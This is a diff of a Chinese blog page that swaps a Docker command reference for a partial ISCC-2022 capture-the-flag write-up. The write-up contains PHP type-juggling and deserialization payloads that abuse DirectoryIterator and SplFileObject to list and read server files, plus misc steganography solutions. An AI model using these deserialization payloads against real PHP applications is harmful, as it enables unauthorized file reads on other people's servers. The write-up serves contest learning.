@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>docker命令大全-本地镜像管理及Docker info 命令 |  欲</title>
+      <title>ISCC-2022（部分wp） |  欲</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-docker命令大全-本地镜像管理与infoversion"
+  id="post-ISCC-2022（部分wp）"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  docker命令大全-本地镜像管理及Docker info 命令
+  ISCC-2022（部分wp）
 </h1>
  
 
@@ -73,15 +73,15 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/10/05/docker%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8-%E6%9C%AC%E5%9C%B0%E9%95%9C%E5%83%8F%E7%AE%A1%E7%90%86%E4%B8%8Einfoversion/" class="article-date">
-  <time datetime="2021-10-05T14:45:23.000Z" itemprop="datePublished">2021-10-05</time>
+      <a href="/2022/05/12/ISCC-2022%EF%BC%88%E9%83%A8%E5%88%86wp%EF%BC%89/" class="article-date">
+  <time datetime="2022-05-12T12:52:01.000Z" itemprop="datePublished">2022-05-12</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.6k</span>
+            <span class="post-count">1.3k</span>
         </span>
     </span>
 
@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">7 分钟</span>
+            <span class="post-count">6 分钟</span>
         </span>
     </span>
 </div>
@@ -105,200 +105,139 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="本地镜像管理"><a href="#本地镜像管理" class="headerlink" title="本地镜像管理"></a>本地镜像管理</h1><p>本文取自<a target="_blank" rel="noopener" href="https://www.runoob.com/docker/docker-rm-command.html">https://www.runoob.com/docker/docker-rm-command.html</a>，博主整理这些命令主要是方便自己或其他需要的人来查阅</p>
-<p>(1)docker images : 列出本地镜像。</p>
-<p>语法<br>docker images [OPTIONS] [REPOSITORY[:TAG]]<br>OPTIONS说明：</p>
-<p>-a :列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）；</p>
-<p>–digests :显示镜像的摘要信息；</p>
-<p>-f :显示满足条件的镜像；</p>
-<p>–format :指定返回值的模板文件；</p>
-<p>–no-trunc :显示完整的镜像信息；</p>
-<p>-q :只显示镜像ID。<span id="more"></span></p>
-<p>实例<br>查看本地镜像列表。</p>
-<pre><code> runoob@runoob:~$ docker images
- REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
- mymysql                 v1                  37af1236adef        5 minutes ago       329 MB
-runoob/ubuntu           v4                  1c06aa18edee        2 days ago          142.1 MB
-&lt;none&gt;                  &lt;none&gt;              5c6e1090e771        2 days ago          165.9 MB
-httpd                   latest              ed38aaffef30        11 days ago         195.1 MB
-alpine                  latest              4e38e38c8ce0        2 weeks ago         4.799 MB
-mongo                   3.2                 282fd552add6        3 weeks ago         336.1 MB
-redis                   latest              4465e4bcad80        3 weeks ago         185.7 MB
-php                     5.6-fpm             025041cd3aa5        3 weeks ago         456.3 MB
-python                  3.5                 045767ddf24a        3 weeks ago         684.1 MB
-</code></pre>
-<p>…<br>列出本地镜像中REPOSITORY为ubuntu的镜像列表。</p>
-<pre><code>root@runoob:~# docker images  ubuntu
-REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
-ubuntu              14.04               90d5884b1ee0        9 weeks ago         188 MB
-ubuntu              15.10               4e3b13c8a266        3 months ago        136.3 MB
-</code></pre>
-<hr>
-<p>(2)docker rmi : 删除本地一个或多个镜像。</p>
-<p>语法<br>docker rmi [OPTIONS] IMAGE [IMAGE…]<br>OPTIONS说明：</p>
-<p>-f :强制删除；</p>
-<p>–no-prune :不移除该镜像的过程镜像，默认移除；</p>
-<p>实例<br>强制删除本地镜像 runoob/ubuntu:v4。</p>
-<pre><code>root@runoob:~# docker rmi -f runoob/ubuntu:v4
-Untagged: runoob/ubuntu:v4
-Deleted: sha256:1c06aa18edee44230f93a90a7d88139235de12cd4c089d41eed8419b503072be
-Deleted: sha256:85feb446e89a28d58ee7d80ea5ce367eebb7cec70f0ec18aa4faa874cbd97c73
-</code></pre>
-<hr>
-<p>(3)docker tag : 标记本地镜像，将其归入某一仓库。</p>
-<p>语法<br>docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG]</p>
-<p>实例<br>将镜像ubuntu:15.10标记为 runoob/ubuntu:v3 镜像。</p>
-<pre><code>root@runoob:~# docker tag ubuntu:15.10 runoob/ubuntu:v3
-root@runoob:~# docker images   runoob/ubuntu:v3
-REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
-runoob/ubuntu       v3                  4e3b13c8a266        3 months ago        136.3 MB
-</code></pre>
-<hr>
-<p>(4)docker build 命令用于使用 Dockerfile 创建镜像。</p>
-<p>语法<br>docker build [OPTIONS] PATH | URL | -<br>OPTIONS说明：</p>
-<p>–build-arg=[] :设置镜像创建时的变量；</p>
-<p>–cpu-shares :设置 cpu 使用权重；</p>
-<p>–cpu-period :限制 CPU CFS周期；</p>
-<p>–cpu-quota :限制 CPU CFS配额；</p>
-<p>–cpuset-cpus :指定使用的CPU id；</p>
-<p>–cpuset-mems :指定使用的内存 id；</p>
-<p>–disable-content-trust :忽略校验，默认开启；</p>
-<p>-f :指定要使用的Dockerfile路径；</p>
-<p>–force-rm :设置镜像过程中删除中间容器；</p>
-<p>–isolation :使用容器隔离技术；</p>
-<p>–label=[] :设置镜像使用的元数据；</p>
-<p>-m :设置内存最大值；</p>
-<p>–memory-swap :设置Swap的最大值为内存+swap，”-1”表示不限swap；</p>
-<p>–no-cache :创建镜像的过程不使用缓存；</p>
-<p>–pull :尝试去更新镜像的新版本；</p>
-<p>–quiet, -q :安静模式，成功后只输出镜像 ID；</p>
-<p>–rm :设置镜像成功后删除中间容器；</p>
-<p>–shm-size :设置/dev/shm的大小，默认值是64M；</p>
-<p>–ulimit :Ulimit配置。</p>
-<p>–squash :将 Dockerfile 中所有的操作压缩为一层。</p>
-<p>–tag, -t: 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。</p>
-<p>–network: 默认 default。在构建期间设置RUN指令的网络模式</p>
-<p>实例<br>使用当前目录的 Dockerfile 创建镜像，标签为 runoob/ubuntu:v1。</p>
-<pre><code> docker build -t runoob/ubuntu:v1 . 
-</code></pre>
-<p>使用URL github.com/creack/docker-firefox 的 Dockerfile 创建镜像。</p>
-<pre><code> docker build github.com/creack/docker-firefox
-</code></pre>
-<p>也可以通过 -f Dockerfile 文件的位置：</p>
-<pre><code>$ docker build -f /path/to/a/Dockerfile .
-</code></pre>
-<p>在 Docker 守护进程执行 Dockerfile 中的指令前，首先会对 Dockerfile 进行语法检查，有语法错误时会返回：</p>
-<pre><code>$ docker build -t test/myapp .
-Sending build context to Docker daemon 2.048 kB
-Error response from daemon: Unknown instruction: RUNCMD
-</code></pre>
-<hr>
-<p>(5)docker history : 查看指定镜像的创建历史。</p>
-<p>语法<br>docker history [OPTIONS] IMAGE</p>
-<p>OPTIONS说明：</p>
-<p>-H :以可读的格式打印镜像大小和日期，默认为true；</p>
-<p>–no-trunc :显示完整的提交记录；</p>
-<p>-q :仅列出提交记录ID。</p>
-<p>实例<br>查看本地镜像runoob/ubuntu:v3的创建历史。</p>
-<pre><code>root@runoob:~# docker history runoob/ubuntu:v3
-IMAGE             CREATED           CREATED BY                                      SIZE      COMMENT
-4e3b13c8a266      3 months ago      /bin/sh -c #(nop) CMD [&quot;/bin/bash&quot;]             0 B                 
-&lt;missing&gt;         3 months ago      /bin/sh -c sed -i &#39;s/^#\s*\(deb.*universe\)$/   1.863 kB            
-&lt;missing&gt;         3 months ago      /bin/sh -c set -xe   &amp;&amp; echo &#39;#!/bin/sh&#39; &gt; /u   701 B               
-&lt;missing&gt;         3 months ago      /bin/sh -c #(nop) ADD file:43cb048516c6b80f22   136.3 MB
-</code></pre>
-<hr>
-<p>(6)docker save : 将指定镜像保存成 tar 归档文件。</p>
-<p>语法<br>docker save [OPTIONS] IMAGE [IMAGE…]</p>
-<p>OPTIONS 说明：</p>
-<p>-o :输出到的文件。</p>
-<p>实例<br>将镜像 runoob/ubuntu:v3 生成 my_ubuntu_v3.tar 文档</p>
-<pre><code>runoob@runoob:~$ docker save -o my_ubuntu_v3.tar runoob/ubuntu:v3
-runoob@runoob:~$ ll my_ubuntu_v3.tar
--rw------- 1 runoob runoob 142102016 Jul 11 01:37 my_ubuntu_v3.ta
-</code></pre>
-<hr>
-<p>(7)docker load : 导入使用 docker save 命令导出的镜像。</p>
-<p>语法<br>docker load [OPTIONS]</p>
-<p>OPTIONS 说明：</p>
-<p>–input , -i : 指定导入的文件，代替 STDIN。</p>
-<p>–quiet , -q : 精简输出信息。</p>
-<p>实例<br>导入镜像：</p>
-<pre><code>$ docker image ls
- REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
-$ docker load &lt; busybox.tar.gz
-Loaded image: busybox:latest
-$ docker images
-REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
-busybox             latest              769b9341d937        7 weeks ago         2.489 MB
-$ docker load --input fedora.tar
-Loaded image: fedora:rawhide
-Loaded image: fedora:20
-$ docker images
-REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
-busybox             latest              769b9341d937        7 weeks ago         2.489 MB
-fedora              rawhide             0d20aec6529d        7 weeks ago         387 MB
-fedora              20                  58394af37342        7 weeks ago         385.5 MB
-fedora              heisenbug           58394af37342        7 weeks ago         385.5 MB
-fedora              latest              58394af37342        7 weeks ago         385.5 MB
-</code></pre>
-<hr>
-<p>(8)docker import : 从归档文件中创建镜像。</p>
-<p>语法<br>docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]</p>
-<p>OPTIONS说明：</p>
-<p>-c :应用docker 指令创建镜像；</p>
-<p>-m :提交时的说明文字；</p>
-<p>实例<br>从镜像归档文件my_ubuntu_v3.tar创建镜像，命名为runoob/ubuntu:v4</p>
-<pre><code>runoob@runoob:~$ docker import  my_ubuntu_v3.tar runoob/ubuntu:v4  
-sha256:63ce4a6d6bc3fabb95dbd6c561404a309b7bdfc4e21c1d59fe9fe4299cbfea39
-runoob@runoob:~$ docker images runoob/ubuntu:v4
-REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
-runoob/ubuntu       v4                  63ce4a6d6bc3        20 seconds ago      142.1 MB
-</code></pre>
-<hr>
-<h1 id="Docker-info-命令"><a href="#Docker-info-命令" class="headerlink" title="Docker info 命令"></a>Docker info 命令</h1><p>(1)docker info : 显示 Docker 系统信息，包括镜像和容器数。。</p>
-<p>语法<br>docker info [OPTIONS]</p>
-<p>实例<br>查看docker系统信息。</p>
-<pre><code>$ docker info
-Containers: 12
-Images: 41
-Storage Driver: aufs
-Root Dir: /var/lib/docker/aufs
-Backing Filesystem: extfs
-Dirs: 66
-Dirperm1 Supported: false
-Execution Driver: native-0.2
-Logging Driver: json-file
-Kernel Version: 3.13.0-32-generic
-Operating System: Ubuntu 14.04.1 LTS
-CPUs: 1
-Total Memory: 1.954 GiB
-Name: iZ23mtq8bs1Z
-ID: M5N4:K6WN:PUNC:73ZN:AONJ:AUHL:KSYH:2JPI:CH3K:O4MK:6OCX:5OYW
-</code></pre>
-<hr>
-<p>(2)docker version :显示 Docker 版本信息。</p>
-<p>语法<br>docker version [OPTIONS]</p>
-<p>OPTIONS说明：</p>
-<p>-f :指定返回值的模板文件。</p>
-<p>实例<br>显示 Docker 版本信息。</p>
-<pre><code>$ docker version
-Client:
-Version:      1.8.2
-API version:  1.20
-Go version:   go1.4.2
-Git commit:   0a8c2e3
-Built:        Thu Sep 10 19:19:00 UTC 2015
-OS/Arch:      linux/amd64
+  <h1 id="ISCC-2022（部分wp）"><a href="#ISCC-2022（部分wp）" class="headerlink" title="ISCC-2022（部分wp）"></a>ISCC-2022（部分wp）</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="冬奥会"><a href="#冬奥会" class="headerlink" title="冬奥会"></a>冬奥会</h2><span id="more"></span>
+<p>（1）码源</p>
+<pre><code>&lt;?php
 
-Server:
-Version:      1.8.2
-API version:  1.20
-Go version:   go1.4.2
-Git commit:   0a8c2e3
-Built:        Thu Sep 10 19:19:00 UTC 2015
-OS/Arch:      linux/amd64
+show_source(__FILE__);
+
+$Step1=False;
+$Step2=False;
+
+$info=(array)json_decode(@$_GET[&#39;Information&#39;]);
+
+if(is_array($info))&#123;
+
+    var_dump($info);
+
+    is_numeric(@$info[&quot;year&quot;])?die(&quot;Sorry~&quot;):NULL;
+    if(@$info[&quot;year&quot;])&#123;
+        ($info[&quot;year&quot;]=2022)?$Step1=True:NULL;
+    &#125;
+    if(is_array(@$info[&quot;items&quot;]))&#123;
+        if(!is_array($info[&quot;items&quot;][1])OR count($info[&quot;items&quot;])!==3 ) die(&quot;Sorry~&quot;);
+        $status = array_search(&quot;skiing&quot;, $info[&quot;items&quot;]);
+        $status===false?die(&quot;Sorry~&quot;):NULL;
+        foreach($info[&quot;items&quot;] as $key=&gt;$val)&#123;
+            $val===&quot;skiing&quot;?die(&quot;Sorry~&quot;):NULL;
+        &#125;
+        $Step2=True;
+    &#125;
+&#125;
+
+if($Step1 &amp;&amp; $Step2)&#123;
+    include &quot;2022flag.php&quot;;echo $flag;
+&#125;
+?&gt; 
 </code></pre>
+<p>（2）用JSON格式的字符串对information传值，里面要求year=2022，并且2022不能为数字，可以用%20绕过，items是个数为3数组，intems[1]也为数组，并且in_array()函数的解释是bool in_array ( mixed needle,arrayhaystack [, bool strict=FALSE]),如果strict参数没有提供或者是false(true会进行严格的过滤)，那么inarray就会使用松散比较来判断needle是否在$haystack中，利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。所有让items[1]或items[3]其中一个为0即可。</p>
+<pre><code>payload：?Information=&#123;&quot;year&quot;:&quot;2022 &quot;,&quot;items&quot;:[1,[1],0]&#125;
+</code></pre>
+<h2 id="Pop2022"><a href="#Pop2022" class="headerlink" title="Pop2022"></a>Pop2022</h2><p>这题其实和nss有一题是完全一样的，套一下payload就出来了</p>
+<h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>（1）F12查看源代码，得到另外一个页面</p>
+<p>（2）看到码源想到原生类</p>
+<p>（3）先用DirectoryIterator指令找一下flag</p>
+<pre><code>data=O:1:&quot;a&quot;:5:&#123;s:3:&quot;un0&quot;;s:17:&quot;DirectoryIterator&quot;;s:3:&quot;un1&quot;;s:23:&quot;glob:///var/www/html/f*&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125;
+</code></pre>
+<p>Your output: fSSsybePonk_FIndMe.txt，还好没有直接输flag，不然还真的找不出来。</p>
+<p>然后再用SplFileObject指令读取，</p>
+<pre><code>&#123;s:3:&quot;un0&quot;;s:13:&quot;SplFileObject&quot;;s:3:&quot;un1&quot;;s:36:&quot;/var/www/html/fSSsybePonk_FIndMe.txt&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125;
+</code></pre>
+<p>flag就出来了</p>
+<p>（4）构建的poc</p>
+<pre><code>poc：
+ &lt;?php
+
+
+class a&#123;
+    public $un0 = &#39;SplFileObject&#39;;
+    public $un1 = &quot;/var/www/html/fSSsybePonk_FIndMe.txt&quot;;
+    public $un2;
+    public $un3= &#39;unserialize&#39;; //= &#39;unserialize&#39;;
+    public $un4;
+    
+    public function __destruct()&#123;
+        if(!empty($this-&gt;un0) &amp;&amp; empty($this-&gt;un2))&#123;
+            $this -&gt; Givemeanew();
+            if($this -&gt; un3 === &#39;unserialize&#39;)&#123;
+                $this -&gt; yigei();
+            &#125;
+            else&#123;
+                $this -&gt; giao();
+            &#125;
+        &#125;
+    &#125;
+
+    public function Givemeanew()&#123;
+
+
+        $this -&gt; un4 = new $this-&gt;un0($this-&gt; un1);        //123;//$this -&gt; un2 =&quot;;echo success;&quot;
+
+        
+    &#125;
+
+    public function yigei()&#123;
+
+        echo &#39;Your output: &#39;.$this-&gt;un4;
+
+    &#125;
+    
+    public function giao()&#123;
+
+        @eval($this-&gt;un2);
+
+    &#125;
+    
+    public function __wakeup()&#123;
+
+        include $this -&gt; un2.&#39;hint.php&#39;; 
+    &#125;
+&#125;
+
+
+$data = new a();
+$b=serialize($data); 
+echo serialize($data); 
+unserialize($b);
+</code></pre>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="单板小将苏翊鸣"><a href="#单板小将苏翊鸣" class="headerlink" title="单板小将苏翊鸣"></a>单板小将苏翊鸣</h2><p>（1）一张图片和一个加密的压缩包<br>用101edit打开，发现CRC报错，猜测可能是图片的宽高被修改，改一下高，爆了一个二维码。</p>
+<p>（2）扫一下，得到Unicode码，解一下<br>\u5728\u8fd9\u6b21\u51ac\u5965\u4f1a\u7684\u821e\u53f0\u4e0a\uff0c\u6211\u56fd\u5c0f\u5c06\u82cf\u7fca\u9e23\u65a9\u83b7\u4e00\u91d1\u4e00\u94f6\uff0c\u90a3\u4f60\u77e5\u9053\u6b64\u6b21\u51ac\u5965\u4f1a\u6211\u56fd\u603b\u5171\u83b7\u5f97\u51e0\u679a\u5956\u724c\u5417\uff1f\u53c8\u5206\u522b\u662f\u51e0\u91d1\u51e0\u94f6\u51e0\u94dc\u5462\uff1f<br>在这次冬奥会的舞台上，我国小将苏翊鸣斩获一金一银，那你知道此次冬奥会我国总共获得几枚奖牌吗？又分别是几金几银几铜呢？<br>15942</p>
+<p>（3）打开压缩包，就有flag。</p>
+<h2 id="2022冬奥会"><a href="#2022冬奥会" class="headerlink" title="2022冬奥会"></a>2022冬奥会</h2><p>和上一题一个思路，同样是改一下高度，爆出Unicode码，截屏识别一下，问你雪融融原型是什么。</p>
+<p>灯笼，打开压缩包，有一张损坏的图片，用101打开一下，就有flag。</p>
+<h2 id="藏在星空中的诗-1"><a href="#藏在星空中的诗-1" class="headerlink" title="藏在星空中的诗-1"></a>藏在星空中的诗-1</h2><p>（1）有个文本和一张图片和一个加密的压缩包</p>
+<p>用ps打开图片，发现有两个图层，其中一个透明度很低，改高点，有一个五角星。</p>
+<p><img src="https://s2.loli.net/2022/05/14/roOx4VhtsjWH6kR.png" alt="图片.png"></p>
+<p>（2）按顺序把文本里的星星符号粘贴到压缩包，得到一个pdf文件，在按pdf文件一个个对应星星图案翻译出flag。</p>
+<h2 id="藏在星空中的诗-2"><a href="#藏在星空中的诗-2" class="headerlink" title="藏在星空中的诗-2"></a>藏在星空中的诗-2</h2><p>（1）先把txt的文本用，星星1的表格对照一下</p>
+<pre><code>\QTTPU\QTTED\QTTPD\QTTPD\QTTKB\QTTPR\QTTDE\QTT=B\QTTEK\QTTET\QTTFO\QTTPO\QTTEP\QTTPK\QTTFI\QTTK=\QTTKK\QTTPT\QTT=P\QTTKH
+</code></pre>
+<p>（2）把重复的去掉</p>
+<p>\PU\ED\PD\PD\KB\PR\DE=B\EK\ET\FO\PO\EP\PK\FI\K=\KK\PT=P\KH</p>
+<p>感觉应该是Unicode码。</p>
+<p>\PU\ED\PD\PD有两个pd对于的应该是ISCC。</p>
+<p>（3）回到对照表，找了好久才发现，要用星星图案对应的Unicode码取最后一位拼接起来。</p>
+<pre><code>\u0049\u0053\u0043\u0043\u007b\u004c\u0035\u002b\u0057\u0050\u006f\u004f\u0054\u0047\u0061\u0072\u0077\u0040\u0024\u007d
+</code></pre>
+<p>（4）在用Unicode转码一下，就有flag。</p>
+<h2 id="真相只有一个"><a href="#真相只有一个" class="headerlink" title="真相只有一个"></a>真相只有一个</h2><p>（1）一张图片，一个txt，一个stram</p>
+<p>图片不知道是用来干什么的，先放一边。</p>
+<p>（2）看了看stream好像缺了文件头，改一下，后缀顺便改成zip，好像有加密，先用ziperello爆破一下zip，跑出密码19981111，这好像要去图片里找，没想到提前出来了。</p>
+<p>（3）解压缩包，得stram文件，wireshark打开，找到了一个MP3文件，导出来，在password.mp3最后听出了一段摩斯密码</p>
+<p>解出来是isccmisc</p>
+<p>（4）看txt里的内容加密的方式应该是snow加密，配合上面解出来的密码，用snow.exe，解密一下。</p>
+<p>得到一串这个玩意，QUmu-U6LP-Gcto</p>
+<p>套进ISCC{}看看，好像可以。</p>
  
       <!-- reward -->
       
@@ -369,12 +308,12 @@ OS/Arch:      linux/amd64
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/10/05/docker%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8-%E6%9C%AC%E5%9C%B0%E9%95%9C%E5%83%8F%E7%AE%A1%E7%90%86%E4%B8%8Einfoversion/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/05/12/ISCC-2022%EF%BC%88%E9%83%A8%E5%88%86wp%EF%BC%89/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A2%98%E7%9B%AE/" rel="tag">题目</a></li></ul>
 
     </footer>
   </div>
@@ -382,19 +321,10 @@ OS/Arch:      linux/amd64
    
   <nav class="article-nav">
     
-      <a href="/2021/10/05/docker%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8-%E5%AE%B9%E5%99%A8%E6%93%8D%E4%BD%9C/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            docker命令大全-容器操作
-          
-        </div>
-      </a>
     
-    
-      <a href="/2021/10/02/sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/" class="article-nav-link">
+      <a href="/2022/04/24/%E7%A5%9E%E5%A5%87%E7%9A%84Unicode%E7%BC%96%E7%A0%81-%E5%BC%BA%E5%88%B6%E6%94%B9%E5%8F%98%E9%80%89%E4%B8%AD%E9%A1%BA%E5%BA%8F/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">SQL 注入原理分析（学习笔记）</div>
+        <div class="article-nav-title">神奇的Unicode编码_强制改变选中顺序</div>
       </a>
     
   </nav>
